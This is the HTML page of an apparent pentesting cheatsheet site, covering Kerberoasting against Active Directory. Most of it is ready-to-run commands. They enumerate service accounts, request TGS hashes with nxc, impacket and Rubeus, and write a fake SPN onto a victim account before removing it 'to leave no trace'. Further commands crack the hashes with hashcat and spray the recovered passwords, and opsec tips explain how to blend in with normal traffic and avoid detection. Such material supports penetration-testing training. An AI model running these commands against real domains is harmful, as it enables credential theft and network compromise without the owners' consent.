@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Kerberoasting | JinPwn</title><meta name="description" content="Request TGS for any user account that has an SPN, get back a hash encrypted with the user&amp;rsquo;s NT key. Crack offline.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/">
+<meta property="og:title" content="Kerberoasting | JinPwn">
+<meta property="og:description" content="Request TGS for any user account that has an SPN, get back a hash encrypted with the user&amp;rsquo;s NT key. Crack offline.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Kerberoasting | JinPwn">
+<meta name="twitter:description" content="Request TGS for any user account that has an SPN, get back a hash encrypted with the user&amp;rsquo;s NT key. Crack offline.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Request TGS for any user account that has an SPN, get back a hash encrypted with the user\u0026rsquo;s NT key. Crack offline.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Kerberoasting | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link">Enumeration</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link is-current">Kerberoasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link">AS-REP Roasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link">Password Spraying</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link">ADCS ESC1-16</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link">DCSync</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link">Trust Attacks</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link">Persistence</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Kerberoasting</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Kerberoasting</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Active Directory Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link">Enumeration</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link is-current">Kerberoasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link">AS-REP Roasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link">Password Spraying</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link">ADCS ESC1-16</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link">DCSync</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link">Trust Attacks</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link">Persistence</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>Request TGS for any user account that has an SPN, get back a hash encrypted with the user&rsquo;s NT key. Crack offline.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
+</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;svc_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
+</span></span></code></pre></div><h2 id="i-find-kerberoastable-users" data-heading-permalink="true"><span class="heading-content">i. Find Kerberoastable users</span>
+    <a class="heading-permalink" href="#i-find-kerberoastable-users" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>BloodHound query, see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad02-bloodhound/">BloodHound</a>
+:</p>
+<pre tabindex="0"><code class="language-cypher" data-lang="cypher">MATCH (u:User {hasspn: true, enabled: true}) RETURN u.name, u.serviceprincipalnames
+</code></pre><p>nxc shortcut, dump SPN candidates:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --get-sid       <span class="c1">## helps disambiguate</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --kerberoasting roast.txt
+</span></span></code></pre></div><p>bloodyAD LDAP filter:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(&amp;(objectClass=user)(servicePrincipalName=*)(!(samAccountName=krbtgt)))&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --attr samaccountname,servicePrincipalName,memberOf
+</span></span></code></pre></div><h2 id="ii-roast-every-roastable-account-one-shot" data-heading-permalink="true"><span class="heading-content">ii. Roast every roastable account, one shot</span>
+    <a class="heading-permalink" href="#ii-roast-every-roastable-account-one-shot" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>nxc, fastest and least painful:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --kerberoasting roast.txt
+</span></span><span class="line"><span class="cl"><span class="c1">## With NTLM hash:</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span> --kerberoasting roast.txt
+</span></span></code></pre></div><p>impacket-GetUserSPNs, the classic:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetUserSPNs -request -dc-ip <span class="nv">$DC</span> <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -outputfile roast.txt
+</span></span><span class="line"><span class="cl"><span class="c1">## With hash:</span>
+</span></span><span class="line"><span class="cl">impacket-GetUserSPNs -request -dc-ip <span class="nv">$DC</span> -hashes :<span class="nv">$NTHASH</span> <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">&#34;</span> -outputfile roast.txt
+</span></span><span class="line"><span class="cl"><span class="c1">## With Kerberos (KRB5CCNAME set):</span>
+</span></span><span class="line"><span class="cl">impacket-GetUserSPNs -k -no-pass -request -dc-ip <span class="nv">$DC</span> <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">&#34;</span> -outputfile roast.txt
+</span></span><span class="line"><span class="cl"><span class="c1">## Format the output as hashcat input explicitly (default is already hashcat):</span>
+</span></span><span class="line"><span class="cl">impacket-GetUserSPNs -request -dc-ip <span class="nv">$DC</span> <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -outputfile roast.txt -no-preauth-pre-validation
+</span></span></code></pre></div><p>Rubeus (from a Windows foothold):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">Rubeus.exe kerberoast /outfile:roast.txt
+</span></span><span class="line"><span class="cl">Rubeus.exe kerberoast /user:svc_account /outfile:roast.txt
+</span></span><span class="line"><span class="cl">Rubeus.exe kerberoast /rc4opsec /outfile:roast.txt              ## only roast accounts that still support RC4 (avoids AES failures)
+</span></span><span class="line"><span class="cl">Rubeus.exe kerberoast /aes /outfile:roast.txt                   ## roast AES instead (-m 19700 in hashcat)
+</span></span></code></pre></div><h2 id="iii-targeted-kerberoast-write-spn-then-roast" data-heading-permalink="true"><span class="heading-content">iii. Targeted Kerberoast (write-SPN-then-roast)</span>
+    <a class="heading-permalink" href="#iii-targeted-kerberoast-write-spn-then-roast" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have GenericWrite or WriteProperty on <code>servicePrincipalName</code> over a user who doesn&rsquo;t have an SPN, set one temporarily, roast, then remove. nxc and targetedKerberoast.py automate this:</p>
+<p>nxc targeted mode (sets <code>cifs/&lt;sam&gt;</code> SPN, roasts, removes):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --kerberoasting roast.txt --targeted-kerberoast victim1 victim2
+</span></span><span class="line"><span class="cl"><span class="c1">## From a file list:</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --kerberoasting roast.txt --targeted-kerberoast victims.list
+</span></span></code></pre></div><p>targetedKerberoast.py (standalone, predates nxc&rsquo;s built-in):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">targetedKerberoast.py -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --dc-ip <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">targetedKerberoast.py -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span> --dc-ip <span class="nv">$DC</span> --request-user victim1
+</span></span></code></pre></div><p>Manual with bloodyAD when you want to control timing or stack with other ACL abuse:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 1. Set a fake SPN on the victim</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object victim --raw <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -v <span class="nv">servicePrincipalName</span><span class="o">=</span>fake/svc.<span class="nv">$DOMAIN</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 2. Roast it (you can target a specific user too)</span>
+</span></span><span class="line"><span class="cl">impacket-GetUserSPNs -request -request-user victim -dc-ip <span class="nv">$DC</span> <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -outputfile roast.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 3. Remove the SPN to leave no trace</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object victim servicePrincipalName
+</span></span></code></pre></div><div class="obsidian-callout callout-tip">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">When to choose manual</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>If you have GenericWrite over many users and want to chain attacks, manual gives you control. If you just want hashes fast, use <code>nxc --targeted-kerberoast</code>.</p>
+  </div>
+</div>
+<h2 id="iv-kerberoast-from-an-asrep-roastable-account-no-creds" data-heading-permalink="true"><span class="heading-content">iv. Kerberoast from an ASREP-roastable account (no creds)</span>
+    <a class="heading-permalink" href="#iv-kerberoast-from-an-asrep-roastable-account-no-creds" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you found an AS-REP roastable user with no creds, you can still use that account to authenticate to LDAP and pull kerberoastable hashes. nxc has this built in:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u asrep_user -p <span class="s1">&#39;&#39;</span> --no-preauth-targets kerberoastable.list --kerberoasting roast.txt
+</span></span></code></pre></div><p><code>--no-preauth-targets</code> accepts a file listing kerberoastable users (or a single user). nxc requests TGS using the no-preauth user as the auth client.</p>
+<h2 id="v-cracking-the-hashes" data-heading-permalink="true"><span class="heading-content">v. Cracking the hashes</span>
+    <a class="heading-permalink" href="#v-cracking-the-hashes" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Format check, the hash should look like <code>$krb5tgs$23$*USERNAME$DOMAIN$SPN*$...</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">head -1 roast.txt
+</span></span></code></pre></div><p>Hashcat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## RC4 (etype 23), the common one</span>
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">13100</span> roast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">13100</span> roast.txt rockyou.txt -r OneRuleToRuleThemAll.rule
+</span></span><span class="line"><span class="cl"><span class="c1">## AES (etype 17/18)</span>
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">19600</span> roast.txt rockyou.txt       <span class="c1">## AES128 etype 17</span>
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">19700</span> roast.txt rockyou.txt       <span class="c1">## AES256 etype 18</span>
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">AES is slow</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>AES TGS hashes are 50,000x slower than RC4. Most modern environments force AES. Use targeted wordlists and rules, not brute force. If you have GPU capacity, see <a href="https://jinpwn.dev/cheatsheets/misc/password-cracking/">Password Cracking</a>
+ for cloud cracking options.</p>
+  </div>
+</div>
+<h2 id="vi-after-cracking" data-heading-permalink="true"><span class="heading-content">vi. After cracking</span>
+    <a class="heading-permalink" href="#vi-after-cracking" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The cracked password is for the SERVICE ACCOUNT. Spray it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u svc_account -p <span class="s1">&#39;Cracked123!&#39;</span> --shares
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u svc_account -p <span class="s1">&#39;Cracked123!&#39;</span> --users
+</span></span></code></pre></div><p>Service accounts often have:</p>
+<ul>
+<li>Admin on the host they run on</li>
+<li>Membership in groups with weak ACLs</li>
+<li>Reused across multiple service accounts</li>
+</ul>
+<p>Always re-collect BloodHound after compromising a new account.</p>
+<h2 id="vii-opsec-notes" data-heading-permalink="true"><span class="heading-content">vii. OpSec notes</span>
+    <a class="heading-permalink" href="#vii-opsec-notes" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li>Kerberoasting requests TGS, which logs as Event 4769 on the DC for each SPN</li>
+<li>Rubeus <code>/rc4opsec</code> filters out accounts where RC4 is disabled (no error noise)</li>
+<li><code>nxc --kerberoasting</code> logs each TGS request, expect to be detected on monitored networks</li>
+<li>AS-REP-roastable account kerberoasting (section iv) still generates 4769 but from the no-preauth user, which is a less common pattern</li>
+</ul>
+<p>For real engagements, kerberoast in small batches and let it look like normal Kerberos traffic. On HTB/labs, fire all at once.</p>
+<h2 id="viii-defense-bypass-when-you-cant-roast-directly" data-heading-permalink="true"><span class="heading-content">viii. Defense bypass: when you can&rsquo;t roast directly</span>
+    <a class="heading-permalink" href="#viii-defense-bypass-when-you-cant-roast-directly" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>If standard <code>--kerberoasting</code> returns nothing useful and <code>--targeted-kerberoast</code> isn&rsquo;t applicable, check:</p>
+<ul>
+<li><strong>Resource-Based Constrained Delegation</strong> path -&gt; <a href="https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/">Delegation</a>
+ (no roasting needed, you take the account directly)</li>
+<li><strong>gMSA accounts</strong> -&gt; <a href="https://jinpwn.dev/cheatsheets/active-directory/ad11-credential-dumping/">Credential Dumping</a>
+, pull the password if you have access</li>
+<li><strong>DCSync rights</strong> -&gt; <a href="https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/">DCSync</a>
+, pull every NTLM hash instead of cracking TGS</li>
+</ul>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/ad02-bloodhound/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">BloodHound</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/active-directory/ad04-as-rep-roasting/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">AS-REP Roasting</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
